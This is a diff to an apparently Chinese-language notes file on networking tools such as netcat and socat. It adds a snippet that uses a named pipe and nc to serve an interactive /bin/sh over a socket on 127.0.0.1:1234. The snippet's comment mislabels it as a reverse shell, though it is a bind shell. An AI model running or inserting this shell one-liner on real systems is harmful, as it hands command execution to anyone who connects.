@@ -1728,6 +1728,11 @@ typedef struct {
     * 注意: 
         * Linux和Windows下netcat参数不同. 
         * 每次请求连接建立后都会关闭(单次连接). 
+    * 开shell
+        ```sh
+            mkfifo /tmp/f;                # 步骤1：创建命名管道
+            cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f  # 步骤2：建立反向Shell
+        ```
 * `socat`: netcat加强版, 可称为`nc++`. 
     * `socat tcp-l:<本地端口>,reuseaddr,fork tcp:<目的地址>:<目的端口>`: 端口转发
     * `socat - UNIX-CONNECT:<unix套接字文件>`: 连接套接字文件进行通信. 
